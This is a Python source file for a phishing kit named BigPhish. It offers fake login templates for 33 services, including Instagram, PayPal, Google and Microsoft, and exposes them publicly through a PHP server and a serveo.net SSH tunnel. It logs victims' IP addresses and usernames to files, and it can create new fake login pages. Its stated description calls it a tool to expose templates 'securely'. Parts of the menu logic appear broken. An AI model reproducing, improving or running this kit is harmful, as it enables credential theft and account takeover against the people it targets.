import argparse
import subprocess
import sys
import time
import random
import string
import os
import shutil

class colors:
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    BOLD = '\033[1m'
    END = '\033[0m'

def display_title():
    title = """
# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# @'########::'####::'######::::'########::'##::::'##:'####::'######::'##::::'##:@
# @ ##.... ##:. ##::'##... ##::::##.... ##: ##:::: ##:. ##::'##... ##: ##:::: ##:@
# @ ##:::: ##:: ##:: ##:::..:::::##:::: ##: ##:::: ##:: ##:: ##:::..:: ##:::: ##:@
# @ ########::: ##:: ##::'####:::########:: #########:: ##::. ######:: #########:@
# @ ##.... ##:: ##:: ##::: ##::::##.....::: ##.... ##:: ##:::..... ##: ##.... ##:@
# @ ##:::: ##:: ##:: ##::: ##::::##:::::::: ##:::: ##:: ##::'##::: ##: ##:::: ##:@
# @ ########::'####:. ######:::::##:::::::: ##:::: ##:'####:. ######:: ##:::: ##:@
# @........:::....:::......:::::..:::::::::..:::::..::....:::......:::..:::::..::@
# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    """
    print(colors.BOLD + colors.GREEN + title + colors.END)

def get_key():
    if sys.platform == 'win32':
        import msvcrt
        return msvcrt.getch().decode()
    else:
        import tty, termios
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            ch = sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        return ch

def create_custom_template(template_count):
    print("Creating a new custom template...")
    # Find the "create" folder in the current working directory
    create_folder = os.path.join(os.getcwd(), "create")
    if not os.path.exists(create_folder):
        print("The 'create' folder does not exist in the current working directory.")
        return

    # Copy files from the "create" folder into the new template folder
    template_name = input("Enter the name of the custom template: ")
    template_directory = f"sites/{template_name}"
    if not os.path.exists(template_directory):
        os.makedirs(template_directory)
    for filename in os.listdir(create_folder):
        shutil.copy(os.path.join(create_folder, filename), template_directory)

    # Create a new login.html file
    login_html_path = os.path.join(template_directory, "login.html")
    print("Please enter the contents of the login.html file.")
    subprocess.run(["vim", login_html_path])

    # Prompt the user to enter a name for the new template folder
    new_folder_name = input("Enter the name for the new template folder: ")
    new_folder_path = os.path.join(os.getcwd(), new_folder_name)
    os.rename(template_directory, new_folder_path)
    print(f"Template folder renamed to '{new_folder_name}' successfully.")

    # Prompt the user to add the new template to the menu loop
    add_to_menu = input("Do you want to add the new template to the menu loop? (y/n): ")
    if add_to_menu.lower() == 'y':
        with open("menu.py", "a") as menu_file:
            menu_file.write(f"    '{template_count}': '{new_folder_name}',\n")
        print("Template added to the menu loop.")
    else:
        print("Template not added to the menu loop.")

    # Increment the number for the custom template
    template_count += 1
    print(f"Custom template created successfully. Template count: {template_count}")
    return template_count

def display_menu(templates):
    paused = False
    selected_template = None
    print("Press SPACE to pause/unpause. Press ENTER to select template.")
    while True:
        if not paused:
            for i, template in enumerate(templates, start=1):
                print(f"\r{colors.BOLD}({i}){colors.END}-{template} ", end="", flush=True)
                time.sleep(0.5)
                sys.stdout.write("\033[K")  # Clear the line
                time.sleep(0.1)

            # Wait for user input
            user_input = input("\n")  # This will pause the display until the user presses Enter

            if user_input == ' ':
                paused = not paused
            elif user_input.isdigit():
                index = int(user_input) - 1
                if 0 <= index < len(templates):
                    selected_template = templates[index]
                    break
                elif index == len(templates):
                    create_custom_template(len(templates) + 1)
                    templates.append(f"{len(templates) + 1}-Custom")
                else:
                    print("Invalid option. Please try again.")
        else:
            print("\rMenu paused. Press SPACE to unpause.", end="", flush=True)
            time.sleep(0.1)
            user_input = input("\n")  # This will pause the display until the user presses Enter
            if user_input == ' ':
                paused = False

    print(f"\nTemplate selected: {selected_template}")


def start_server(choice, subdom):
    print(colors.GREEN + "Loading Template..." + colors.END)
    print(colors.BOLD + "Choose Server Type: 1. Serveo  2. Custom Subdomain" + colors.END)
    server_choice = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    if server_choice == "1":
        print(colors.BOLD + "Enter A Custom Subdomain (press Enter for random):" + colors.END)
        subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
        if not subdom:
            subdom = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        print(colors.GREEN + f"Starting Server at {subdom}.serveo.net..." + colors.END)
        print(colors.BOLD + f"Logs Can Be Found In sites/{choice}/ip.txt and sites/{choice}/usernames.txt" + colors.END)
        cmd_line = f"php -t sites/{choice} -S 127.0.0.1:80 & ssh -R {subdom}.serveo.net:80:127.0.0.1:80 serveo.net"
    elif server_choice == "2":
        subdom = input(colors.BOLD + "Enter custom subdomain:" + colors.END + " ")
        print(colors.GREEN + f"Starting Server at {subdom}..." + colors.END)
        print(colors.BOLD + f"Logs Can Be Found In sites/{choice}/ip.txt and sites/{choice}/usernames.txt" + colors.END)
        cmd_line = f"php -t sites/{choice} -S 127.0.0.1:80"
    else:
        print(colors.RED + "Invalid choice. Exiting..." + colors.END)
        sys.exit(1)

    p = subprocess.Popen(cmd_line, shell=True)

def main():
    parser = argparse.ArgumentParser(description="BigPhish: Expose local templates to the internet securely")
    parser.add_argument("template", nargs='?', help="Choose a template number to host", type=int, choices=range(1, 34))
    args = parser.parse_args()

    if args.template is None:
        display_title() 


    try:
        display_title()

        # Generate list of templates
        templates = [
        "1-Instagram", "2-Facebook", "3-Snapchat", "4-Twitter", "5-GitHub", "6-Google", 
        "7-Spotify", "8-Netflix", "9-PayPal", "10-Origin", "11-Steam", "12-Yahoo!", 
        "13-LinkedIn", "14-Protonmail", "15-Wordpress", "16-Microsoft", "17-IGFollowers", 
        "18-eBay", "19-Pinterest", "20-CryptoCurrency", "21-Verizon", "22-DropBox", 
        "23-Adobe ID", "24-Shopify", "25-FB Messenger", "26-GitLab", "27-Twitch", 
        "28-MySpace", "29-Badoo", "30-VK", "31-Yandex", "32-devianART", "33-Custom"
        ]


        display_menu(templates)

        start_server(args.template, None)
        print(colors.GREEN + "Server started successfully. Press Ctrl+C to exit." + colors.END)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
    except Exception as e:
        print(colors.RED + "An error occurred:", e, colors.END)
        sys.exit(1)

if __name__ == "__main__":
    main()

